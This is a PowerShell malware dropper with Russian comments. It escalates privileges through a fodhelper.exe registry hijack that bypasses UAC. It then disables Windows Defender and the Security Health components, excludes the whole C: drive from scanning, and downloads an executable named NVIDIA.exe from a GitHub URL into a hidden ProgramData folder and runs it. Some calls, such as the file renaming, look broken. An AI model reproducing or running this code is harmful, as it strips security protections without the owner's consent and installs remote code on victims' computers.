# Функция для повышения прав администратора
function Elevate {
    $scriptPath = "$env:TEMP\getadmin.ps1"
    $command = @"
Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb runAs
"@
    Set-Content -Path $scriptPath -Value $command
    Invoke-Expression -Command $command
}

# Функция для выполнения действий при недостаточных правах (UAC)
function UACPrompt {
    # Выполнение изменений в реестре
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" -Force
    Set-ItemProperty -Path "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value " " -Force

    # Запуск fodhelper.exe
    Start-Process "fodhelper.exe"

    # Повышение прав для скрипта
    Elevate
}

# Функция для выполнения действий, когда права администратора уже получены
function gotAdmin {
    # Переход в рабочую директорию
    Push-Location
    Set-Location -Path (Split-Path -Parent $MyInvocation.MyCommand.Path)

    # Отключение защиты Windows Defender
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWord -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -PropertyType DWord -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWord -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force

    # Удаление записи о SecurityHealth из реестра
    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -Force

    # Права владельца и переименование файлов
    Take-Ownership "C:\Windows\System32\SecurityHealthService.exe"
    Set-ItemProperty -Path "C:\Windows\System32\SecurityHealthService.exe" -Name "name" -Value "Celka.sej"
    Take-Ownership "C:\Windows\System32\SecurityHealthSystray.exe"
    Set-ItemProperty -Path "C:\Windows\System32\SecurityHealthSystray.exe" -Name "name" -Value "Nurik.nes"

    # Убийство процесса
    Stop-Process -Name "SecurityHealthSystray" -Force

    # Исключение для Windows Defender
    Add-MpPreference -ExclusionPath "C:\"

    # Создание скрытой папки и скачивание файла
    New-Item -Path "C:\ProgramData\QQQ" -ItemType Directory
    Set-ItemProperty -Path "C:\ProgramData\QQQ" -Name "Hidden" -Value $true
    Invoke-WebRequest -Uri "https://github.com/pr0niums/Repo/raw/refs/heads/main/NVIDIA.exe" -OutFile "C:\ProgramData\QQQ\NVIDIA.exe"

    # Запуск скачанного исполнимого файла
    Start-Process -FilePath "C:\ProgramData\QQQ\NVIDIA.exe"
}

# Проверка архитектуры процессора и попытка получения прав администратора
$ProcessorArchitecture = $env:PROCESSOR_ARCHITECTURE
if ($ProcessorArchitecture -eq "amd64") {
    try {
        & "$env:SYSTEMROOT\SysWOW64\cacls.exe" "$env:SYSTEMROOT\SysWOW64\config\system" > $null 2>&1
    } catch {
        UACPrompt
    }
} else {
    try {
        & "$env:SYSTEMROOT\system32\cacls.exe" "$env:SYSTEMROOT\system32\config\system" > $null 2>&1
    } catch {
        UACPrompt
    }
}

if ($LASTEXITCODE -ne 0) {
    UACPrompt
} else {
    gotAdmin
}
